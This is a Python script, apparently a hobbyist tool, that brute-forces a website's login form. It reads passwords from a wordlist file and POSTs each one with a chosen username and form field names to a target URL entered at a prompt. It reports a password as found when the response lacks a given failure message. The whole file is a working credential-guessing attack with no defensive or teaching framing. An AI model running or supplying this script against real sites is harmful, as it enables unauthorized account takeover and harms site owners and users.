import os
import sys
from time import sleep
import requests

class Cracker():
    def __init__(self, url, file, login, submit, params_names, fail_phrase):
        self.submit = submit
        self.url = url
        self.fail = fail_phrase
        self.file_name = file
        if os.path.exists(file):
            # Read data from file
            self.passes = self.read_data(self.file_name)
            print("Data correctly loaded!")
            print(self.passes)

            self.login = login
            if len(login) == 0:
                print("Login not specified!")
                sys.exit()

            # Prepare data to send
            try:
                self.data = []
                for pas in self.passes:
                    self.data.append((params_names[0], self.login, params_names[1], pas, params_names[2], self.submit))
                print("Data correctly prepared!")
                print(self.data)


            except IndexError:
                print("Params names specified incorrectly")
                sys.exit()

            # Send data to server
            for index, single_data in enumerate(self.data):
                print(f"[ {index+1}/{len(self.passes)} ] Sending ", single_data, "for", self.url)
                if self.send(self.url, single_data, self.fail):
                    print("Password found!")
                    print("Login:", self.login)
                    print("Password:", single_data[3])

        else:
            print("File could not be found!")
            sys.exit()


    def read_data(self, filename):
        with open(filename, 'r') as f:
            lines = f.read().split('\n')
            return lines

    def send(self, url, data, fail):
        ready_data = {data[0]: data[1], data[2]: data[3], data[4]: data[5]}
        r = requests.post(url=url, data=ready_data)
        if fail in r.text:
            return False
        else:
            return True

_website = str(input("Ip address/Domain of a Website \n Eg. https://cracking.dresperanto.repl.co/: \n"))
_pwd = str(input("Path to file with Passwords \n Eg. /home/hackerman/Programming/pwd cracking/cracking program/passes.txt: \n"))
_login = str(input("Value of a Login/Username \n Eg. admin or root: \n"))
_button_value = str(input("Value of a Submit Button \n Eg. Login: \n"))
_username = str(input("Post name of a Login/Username Box \n Eg. Username: \n"))
_pass = str(input("Post name of a Password Box \n Eg. Password: \n"))
_button_post = str(input("Post name of a Password Box \n Eg. Submit: \n"))
_fail = str(input("Fail message \n Eg. Invalid Login Details: \n"))
cracker = Cracker(_website, _pwd, _login, _button_value, (_username, _pass, _button_post), _fail)
